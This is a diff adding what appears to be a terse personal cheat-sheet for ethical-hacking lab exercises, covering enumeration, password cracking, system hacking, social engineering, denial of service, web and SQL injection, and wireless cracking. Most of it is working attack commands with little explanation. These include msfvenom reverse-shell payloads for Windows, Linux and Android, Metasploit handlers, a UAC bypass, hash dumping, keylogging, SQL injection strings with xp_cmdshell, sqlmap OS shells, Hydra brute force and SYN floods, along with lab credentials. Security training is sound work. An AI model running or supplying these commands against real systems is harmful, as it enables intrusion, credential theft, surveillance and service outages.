@@ -1,0 +1,705 @@
+Module 04: Enumeration
+
+Exercise 1: NetBIOS Enumeration Using Global Network Inventory
+
+Exercise 2: Enumerating Network Resources Using Advanced IP Scanner
+==> SHUTDOWN PC
+
+Exercise 3: Performing Network Enumeration Using SuperScan
+
+Exercise 4: Enumerating Resources in a Local Machine Using Hyena
+
+Exercise 5: Performing Network Enumeration Using NetBIOS Enumerator
+
+Exercise 6: Enumerating a Network Using SoftPerfect Network Scanner
+==> TELNET
+
+Exercise 7: Enumerating a Target Network using Nmap and Net Use
+==>NMAP
+nmap -O 10.10.10.16
+==> NET USE
+nbtstat -A 10.10.10.16
+net use
+net use \\10.10.10.16\e ""\user:""
+net use \\10.10.10.16\e ""/user:""
+net use
+
+Exercise 8: Enumerating Services on a Target Machine
+==>NMAP
+nmap -sP 10.10.10.1/24
+nmap -sS 10.10.10.12
+nmap -sSV -O 10.10.10.12
+nmap -sSV -O 10.10.10.12 -oN Enumeration.txt
+
+Exercise 9: SNMP Enumeration Using snmp_enum
+==>NMAP
+nmap -sU -p 161 10.10.10.12
+nmap -sU -p 161 --script=snmp-brute 10.10.10.12
+msfconsole
+use auxiliary/scanner/snmp/snmp_login
+show options
+set RHOSTS 10.10.10.12 
+exploit
+use auxiliary/scanner/snmp/snmp_enum
+set RHOSTS 10.10.10.12 
+exploit
+
+Exercise 10: LDAP Enumeration Using Active Directory Explorer (ADExplorer)
+==> MODIFY USERNAME
+
+Exercise 11: Enumerating information from Windows and Samba host using Enum4linux
+enum4linux -u martin -p apple -U 10.10.10.12
+enum4linux -u martin -p apple -o 10.10.10.12 
+enum4linux -u martin -p apple -P 10.10.10.12
+enum4linux -u martin -p apple -G 10.10.10.12
+enum4linux -u martin -p apple -S 10.10.10.12
+
+
+
+
+Module 05: Vulnerability Analysis
+
+Exercise 1: Vulnerability Analysis Using Nessus
+Windows Server 2016
+https://localhost:8834
+Username: admin
+Password: password
+AD143/qwerty@123
+
+Exercise 2: CGI Scanning with Nikto
+nikto -h
+nikto -H
+nikto -h http://www.goodshopping.com -Tuning 1
+
+
+
+
+Module 06: System Hacking
+
+Exercise 1: Dumping and Cracking SAM Hashes to Extract Plaintext Passwords
+CMD (RUN AS ADMIN)
+wmic useraccount get name,sid 
+Password Cracking Tools ==> pwdump7
+> PwDump7.exe > c:\hashes.txt
+Password Cracking Tools\ophcrack\x86 ==> ophcrack.exe 
+
+Exercise 2: Creating and Using Rainbow Tables
+Tools to Create Rainbow Tables\Winrtgen ==> winrtgen.exe
+Password Cracking Tools\RainbowCrack ==> rcrack_gui.exe
+
+Exercise 3: Auditing System Passwords Using L0phtCrack
+Password Cracking Tools\L0phtCrack.==> lc7setup_v7.0.15_Win64.exe
+10.10.10.12
+Username: Administrator
+Password: Pa$$w0rd
+Domain: CEH.com
+
+Exercise 4: Exploiting Client Side Vulnerabilities and Establishing a VNC Session
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.10.10.11 LPORT=444 -o /root/Desktop/Test.exe
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share 
+mv /root/Desktop/Test.exe /var/www/html/share 
+service apache2 start 
+msfconsole 
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.10.11 (kali)
+set LPORT 444
+exploit
+
+go to Win 10 (10.10.10.10)= 10.10.10.11/share/
+
+kali = meterpreter > sysinfo
+meterpreter > run vnc
+
+Exercise 5: Escalating Privileges by Exploiting Client Side Vulnerabilities
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Exploit.exe
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share 
+ls -la /var/www/html/ | grep share
+service apache2 start
+cp /root/Desktop/Exploit.exe /var/www/html/share/
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.10.11 (kali)
+exploit -j -z
+
+go to Win 10 (10.10.10.10)= 10.10.10.11/share/
+
+kali = meterpreter > getuid
+run post/windows/gather/smart_hashdump
+getsystem -t 1
+background 
+ use exploit/windows/local/bypassuac_fodhelper 
+show options
+set SESSION 1
+set payload windows/meterpreter/reverse_tcp
+show options 
+set LHOST 10.10.10.11
+set TARGET 0
+exploit
+
+meterpreter > getuid
+meterpreter > getsystem
+meterpreter > getuid
+meterpreter > run post/windows/gather/smart_hashdump
+
+Exercise 6: Hacking Windows 10 using Metasploit, and Post-Exploitation Using Meterpreter
+Windows 10 ==> My credit card account number is 123456789 = secret.txt (desktop)
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Backdoor.exe
+mkdir /var/www/html/share
+service apache2 start 
+cp /root/Desktop/Backdoor.exe /var/www/html/share/
+msfconsole
+exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST 10.10.10.11
+show options 
+exploit -j -z 
+
+go to Win 10 (10.10.10.10)= 10.10.10.11/share/
+
+sessions -i 1
+meterpreter > sysinfo
+meterpreter > ipconfig
+meterpreter > getuid
+meterpreter > pwd
+meterpreter > ls
+meterpreter > cat secret.txt
+meterpreter > timestomp secret.txt -v
+meterpreter > cd C:\ 
+meterpreter > pwd
+meterpreter > ls
+meterpreter > download bootmgr
+meterpreter > search -f pagefile.sys
+meterpreter > keyscan_start
+
+go to Win 10 (10.10.10.10)= Add phone, mail to secret.txt (desktop)
+
+meterpreter > keyscan_dump
+meterpreter > idletime
+meterpreter > shutdown
+
+Exercise 7: User System Monitoring and Surveillance Using Spytech SpyAgent
+server 2016
+REMOTE DESKTOP = 10.10.10.12 = Administrator = Pa$$w0rd
+\Spyware\General Spyware\Spytech SpyAgent ==> (password=spytech).exe.
+qwerty@123
+
+server2012
+secret.txt (desktop)
+
+server 2016
+REMOTE DESKTOP = 10.10.10.12 = Administrator = Pa$$w0rd
+CTRL+Shift+Alt+M
+qwerty@123
+Keyboard & Mouse = View Keystrokes Log
+
+Exercise 8: Web Activity Monitoring and Recording using Power Spy
+server 2016
+REMOTE DESKTOP = 10.10.10.12 = Administrator = Pa$$w0rd
+\Spyware\General Spyware\Power Spy
+qwerty@123
+Ctrl+Alt+X
+
+server2012
+secret.txt (desktop)
+
+server 2016
+REMOTE DESKTOP = 10.10.10.12 = Administrator = Pa$$w0rd
+CTRL+Alt+X
+qwerty@123
+
+Exercise 9: Hiding Files Using NTFS Streams
+C:\magic (copy calc.exe)
+notepad readme.txt
+dir
+type c:\magic\calc.exe > c:\magic\readme.txt:calc.exe
+dir
+mklink backdoor.exe readme.txt:calc.exe
+backdoor.exe
+
+Exercise 10: Hiding Data Using White Space Steganography
+\Steganography Tools\Whitespace Steganography Tools
+snow = Open command window here
+snow -C -m "My swiss bank account number is 45656684512263" -p "magic" readme.txt readme2.txt
+snow -C -p "magic" readme2.txt
+
+Exercise 11: Image Steganography Using OpenStego
+\Steganography Tools\Image Steganography Tools\OpenStego
+
+Exercise 12: Image Steganography Using Quick Stego
+\Steganography Tools\Image Steganography Tools\QuickStego
+
+Exercise 13: Viewing, Enabling, and Clearing Audit Policies Using Auditpol
+CMD
+auditpol /get /category:*
+auditpol /set /category:"system","account logon" /success:enable /failure:enable
+auditpol /get /category:*
+auditpol /clear /y
+auditpol /get /category:*
+
+Exercise 14: Covert Channels using Covert_TCP
+KALI
+cd Desktop 
+mkdir send
+cd send/ 
+echo "Secret Message" > message.txt 
+
+other location =  smb://10.10.10.16 (connect to server)
+Administrator
+Pa$$w0rd
+\Covert_TCP = COPY covert_tcp.c
+PASTE = desktop = send folder
+cc -o covert_tcp covert_tcp.c
+
+UBUNTU
+desktop = recieve
+smb://10.10.10.16 (connect to server)
+Administrator
+Pa$$w0rd
+GOTO e$\CEHv10 Module 06 System Hacking\Covert_TCP = COPY covert_tcp.c
+PASTE = desktop = recieve folder
+cc -o covert_tcp covert_tcp.c
+sudo su
+./covert_tcp dest 10.10.10.9 source 10.10.10.11 source_port 9999 dest_port 8888 server file /home/ubuntu/Desktop/receive/receive.txt
+
+KALI = wireshark
+./covert_tcp dest 10.10.10.9 source 10.10.10.11 -source_port 8888 dest_port 9999 file /root/Desktop/send/message.txt
+
+UBUNTU = msg sent
+
+KALI = see in WIRESHARK info of all pkts
+
+Exercise 15: Hacking Windows Server 2012 with a Malicious Office Document Using TheFatRat
+KALI
+fatrat
+6
+3
+10.10.10.11
+Set LHOST IP: 10.10.10.11
+set LPORT: 4444
+payload
+3
+8
+7
+2
+Set LHOST IP: 10.10.10.11
+set LPORT: 4444
+BadDoc
+y
+/root/TheFatRat/output/payload.exe
+3
+mkdir /var/www/html/share
+mv /root/TheFatRat/output/BadDoc.docm /var/www/html/share/ 
+service apache2 start
+msfconsole
+use multi/handler
+set payload windows/meterpreter/reverse_tcp 
+set LHOST 10.10.10.11
+set LPORT 4444
+
+SERVER 2012
+http://10.10.10.11/share/
+BadDoc.docm
+
+KALI
+meterpreter > sysinfo
+
+Exercise 16: Active Online Attack using Responder
+
+WIN10
+Jason
+qwery
+
+KALI
+ responder -I eth0
+
+WIN10
+RUN
+\\ceh-tools
+
+KALI
+GOTO  usr\share\responder\logs 
+ john /usr/share/responder/logs/<file name of the logs.txt>
+
+
+
+
+Module 09: Social Engineering
+
+Exercise 1: Sniffing Website Credentials Using Social Engineering Toolkit (SET)
+KALI
+Applications --> 08 - Exploitation Tools --> social engineering toolkit
+1
+2
+3
+2
+POST back in Harvester/Tabnabbing
+10.10.10.11
+http://www.moviescope.com
+
+SERVER 2016
+10.10.10.11
+sam
+test@123
+
+
+
+
+Module 10: Denial-of-Service
+
+Exercise 1: SYN Flooding a Target Host Using Metasploit
+WIN10 = WIRESHARK
+
+KALI
+nmap -p 21 10.10.10.10
+msfconsole
+use auxiliary/dos/tcp/synflood
+show options
+set RHOST 10.10.10.10
+set RPORT 21 
+set SHOST 10.10.10.16
+set TIMEOUT 20000
+exploit
+
+WIRESHARK = tcp
+Task Manager
+
+KALI
+Ctrl+C
+
+Exercise 2: SYN Flooding a Target Host Using hping3
+WIN10 = WIRESHARK
+KALI
+01 - Information Gathering  = Live Host Identification = hping3
+hping3 -S 10.10.10.10 -a 10.10.10.11 -p 22 --flood
+
+WIRESHARK 
+
+Exercise 3: Performing Distributed Denial of Service Attack Using HOIC
+SERVER2012
+WIN10
+WIN8
+
+HOIC = 10.10.10.11 = threads 20
+
+KALI = WIRESHARK
+
+
+
+
+Module 11: Session Hijacking
+
+Exercise 1: Session Hijacking Using the Zed Attack Proxy (ZAP)
+WIN10
+Chrome://settings = Advanced
+System = proxy settings 
+Connections = LAN settings 
+10.10.10.16
+8080
+
+SERVER2016
+OWASP ZAP 2.7.0 (desktop)
++ Break tab
+ Tools and click Options
+Local Proxies 
+10.10.10.16
+8080
+Set break on all requests and responses (GREEN BALL)
+or
+Drop to dispose of the request or response
+
+WIN10
+http://www.moviescope.com
+
+SERVER2016
+Submit and step to next request or response
+replace www.moviescope.com to www.goodshopping.com
+
+
+
+
+Module 12: Evading IDS Firewalls and Honeypots
+Exercise 1: Detecting Intrusions Using Snort
+\Intrusion Detection Tools\Snort\snortrules\etc 
+\Intrusion Detection Tools\Snort\snortrules
+COPY snort.conf == and so_rules and preproc_rules and rules
+PASTE C:\Snort\etc == and C:\Snort
+Shift+right-click on bin = CMD HERE
+snort
+Ctrl+C
+snort -W
+snort dev i 1
+ANOTHER CMD
+ping 10.10.10.10
+C:\Snort\etc, and right-click on snort.conf = Notepad++
+HOME_NET line (Line 45) = 10.10.10.12
+Line 104 replace ../rules with C:\Snort\rules,
+in Line 105 ../so_rules replace with C:\Snort\so_rules 
+in Line 106 replace ../preproc_rules with C:\Snort\preproc_rules.
+C:\Snort\rules
+CREATE white_list and black_list 
+.txt to .rules
+(Line 238). Configure dynamic loaded libraries 
+ dynamic preprocessor libraries (Line 243), replace /usr/local/lib/snort_dynamicpreprocessor/ 
+with C:\Snort\lib\snort_dynamicpreprocessor
+ base preprocessor (or dynamic) engine (Line 246)
+ /usr/local/lib/snort_dynamicengine/libsf_engine.so 
+with C:\Snort\lib\snort_dynamicengine\sf_engine.dll
+Comment (#)  = (Line 249).
+Configure Preprocessors section (Line 252)
+Comment = each preprocessor rule (261-265).
+ line 325 =  Delete only lzma
+504-509 = remove backslash (\) at the end of each line.
+(add # before each line) 504-509
+Configure output plugins (Line 512) = (classification.config and reference.config files) C:\Snort\etc
+ (in Lines 531 and 532) i.e., C:\Snort\etc\classification.config and C:\Snort\etc\reference.config.
+output alert_fast: alerts.ids in line #533 = dump all logs in the alerts.ids
+find and replace the ipvar string with var
+C:\Snort\rules and open the icmp-info.rules
+Type alert icmp $EXTERNAL_NET any -> $HOME_NET 10.10.10.12 (msg:"ICMP-INFO PING"; icode:0; itype:8; reference:arachnids,135; reference:cve,1999-0265; classtype:bad-unknown; sid:472; rev:7;) in line 21, and save it.
+C:\Snort and Shift+right-click on bin folder, select Open command window here
+Type snort -iX -A console -c C:\Snort\etc\snort.conf -l C:\Snort\log -K ascii   (X is 1)=device ID)
+
+WIN10
+ping 10.10.10.12 -t
+
+SERVER2012
+see CMD
+C:\Snort\log\10.10.10.10 
+ICMP_ECHO.ids
+
+Exercise 2: Detecting Malicious Network Traffic Using HoneyBOT
+SERVER2016
+RUN inetmgr
+Server node --> Expand Sites node --> Right-click FTP 
+--> Select Manage FTP Site --> Click Stop
+\Honeypot Tools\HoneyBOT = HoneyBOT_018.exe
+
+KALI
+ftp 10.10.10.16
+telnet
+
+Exercise 3: Bypassing Windows Firewall Using Nmap Evasion Techniques
+WIN10
+Turn on firewall
+windows defender = 
+ Inbound Rules in the left pane and click New Rule under Actions 
+CUSTOM
+PROTS
+(remote) THESE IP = 10.10.10.11
+BLOCK CONN.,
+
+KALI
+nmap 10.10.10.10
+nmap -T4 -A 10.10.10.10
+nmap -sP 10.10.10.0/24
+nmap -sI 10.10.10.12 10.10.10.10
+
+
+Exercise 4: Bypassing Firewall Rules Using HTTP/FTP Tunneling
+WIN12
+services =   IIS Admin Service and World Wide Web Publishing
+\HTTP Tunneling Tools\HTTHost
+Personal Password is magic.
+WIN16
+inetmgr
+stop FTP
+turn on FIREWALL
+firewall = outbound rule BLOCK FTP 21
+enable rule
+\HTTP Tunneling Tools\HTTPort
+ADD new mapping = local + remote 10.10.10.10 = 21
+CMD 
+ftp 10.10.10.10
+ftp 127.0.0.1
+jason
+qwerty
+mkdir test
+
+Exercise 5: Bypassing Windows Firewall using Metasploit
+WIN16
+turn on firewall
+
+KALI
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -e x86/shikata_ga_nai -b "\x00" LHOST=10.10.10.11 -f exe > Desktop/Backdoor.exe 
+<<see above reverse tcp backdoor procedure>>
+
+
+
+
+
+Module 13: Hacking Web Servers
+Exercise 1: Performing Web Server Reconnaissance using Skipfish
+skipfish -o /root/test -S /usr/share/skipfish/dictionaries/
+complete.wl http://[IP Address of Windows Server 2012]:8080 
+
+Exercise 2: Footprinting a Web Server Using the httprecon Tool
+16
+\Web Server Footprinting Tools\httprecon
+10.10.10.12:8080/ceh
+8080
+
+Exercise 3: Footprinting a Web Server Using ID Serve
+16
+\Web Server Footprinting Tools\ID Serve 
+
+Exercise 4: Cracking FTP Credentials Using Dictionary Attack
+KALI
+nmap -p 21 [IP Address of Windows 10] 
+ftp 10.10.10.10
+NEW TL = 
+hydra -L /root/Desktop/Wordlists/Usernames.txt -P /root/Desktop/Wordlists/Passwords.txt ftp://[IP Address of Windows 10]
+Martin
+apple
+
+Exercise 5: Uniscan Web Server Fingerprinting in Kali Linux
+uniscan -h
+uniscan -u http://10.10.10.12:8080/CEH -q
+uniscan -u http://10.10.10.12:8080/CEH -we
+uniscan -u http://10.10.10.12:8080/CEH -d 
+Computer/usr/share/uniscan/report
+
+
+
+
+
+Module 14: Hacking Web Applications
+
+Exercise 1: Exploiting Parameter Tampering and XSS Vulnerabilities in Web Applications
+WIN10
+http://www.moviescope.com
+john
+test
+contact us = <script>alert("You are hacked")</script> 
+
+12
+http://www.moviescope.com
+steve
+test
+contact us = <script>alert("You are hacked")</script> 
+
+Exercise 2: Enumerating and Hacking a Web Application Using WPScan and Metasploit
+wpscan --url http://[IP Address of Windows Server 2012]:8080/CEH --enumerate u
+msfconsole
+use auxiliary/scanner/http/wordpress_login_enum
+show options
+PASS_FILE /root/Desktop/Wordlists/Passwords.txt
+RHOSTS [IP Address of Windows Server 2012]
+RPORT 8080 
+TARGETURI http://[IP Address of Windows Server 2012]:8080/CEH/ 
+USERNAME admin
+run
+admin
+qwerty@123
+http://[IP Address of Windows Server 2012]:8080/CEH/wp-login.php 
+
+Exercise 3: Exploiting Remote Command Execution Vulnerability to Compromise a Target Web Server
+http://10.10.10.12:8080/dvwa
+gordonb
+abc123
+PING = 10.10.10.12
+| hostname 
+SEC LEV = impossible to low
+| tasklist
+
+REMOTE DESKTOP = 10.10.10.12
+test
+blank pwd
+
+Exercise 4: Auditing Web Application Framework Using Vega
+Applications --> 03 - Web Application Analysis --> Vega.
+http://10.10.10.12:8080/dvwa
+
+Exercise 5: Website Vulnerability Scanning Using Acunetix WVS
+12
+\Web Application Security Tools\Acunetix Web Vulnerability Scanner 
+
+msfvenom -p php/meterpreter/reverse_tcp lhost=10.10.10.11 lport=4444 -f raw 
+http://10.10.10.12:8080/dvwa/login.php
+upload php
+<reverse tcp>
+http://10.10.10.12:8080/dvwa/hackable/uploads/upload.php
+browser = manual proxy
+burp suite
+no proxy
+<reverse tcp L = 10.10.10.11 4444>
+
+Exercise 7: Performing Cross-Site Request Forgery (CSRF) Attack
+12
+http://10.10.10.12:8080/CEH/wp-login.php?
+admin
+qwerty@123
+
+
+
+
+Module 15: SQL Injection
+
+blah' or 1=1 --
+blah';insert into login values ('john','apple123'); --
+blah';create database mydatabase; --
+blah';exec master..xp_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
+
+
+2016
+nSTALKER
+
+moviescope.com
+inspect element = console <COPY>
+sqlmap -u http://www.moviescope.com/viewprofile.aspx?id=1 --cookie=<cookie value which you have copied in step #5> --dbs
+sqlmap -u http://www.moviescope.com/viewprofile.aspx?id=1 --cookie=<cookie value which you have copied in step #5> -D moviescope --tables 
+sqlmap -u http://www.moviescope.com/viewprofile.aspx?id=1 --cookie=<cookie value which you have copied in step #5> -D moviescope -T User_Login --columns
+sqlmap -u http://www.moviescope.com/viewprofile.aspx?id=1 --cookie=<cookie value which you have copied in step #5> -D moviescope -T User_Login --dump 
+john
+test
+ sqlmap -u http://www.moviescope.com/viewprofile.aspx?id=1 --cookie=<cookie value which you have copied in step #5> --os-shell 
+hostname
+ipconfig
+
+
+
+
+Module 16: Hacking Wireless Networks
+
+\Sample Captures and select WEPcrack-01.cap
+
+Exercise: 2 Cracking a WEP with Aircrack-ng
+
+copy sample captures form WIN12 (13 Hacking Web Servers)
+aircrack-ng '/root/Desktop/Sample Captures/WEPcrack-01.cap'
+
+Exercise: 3 Cracking a WPA (Wi-Fi Protected Access) with Aircrack-ng
+
+aircrack-ng -a2 -b 20:E5:2A:E4:38:00 -w /root/Desktop/Wordlists/Passwords.txt '/root/Desktop/Sample Captures/WPA2crack-01.cap'
+
+
+Module 17: Hacking Mobile Platforms
+
+service postgresql start 
+msfvenom -l
+android/meterpreter/reverse_tcp
+ msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.10.11 R > Desktop/Backdoor.apk
+http://10.10.10.11/share 
+
+
+Module 18: Mobile
+/usr/share/set/src/logs, and double-click the harvester.log
+
+
+
+Module 19: Cloud Computing
+http://localhost/owncloud
+admin
+qwerty@123
+
+msfvenom -p windows/meterpreter/reverse_tcp -f exe > /root/Desktop/trojan.exe
+
+msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.10.11 LPORT=4444 --platform linux -f elf > /root/Desktop/exploit.elf 
+<reverse tcp L = 10.10.10.11 4444>
+
+./Slowloris.pl -dns 10.10.10.9
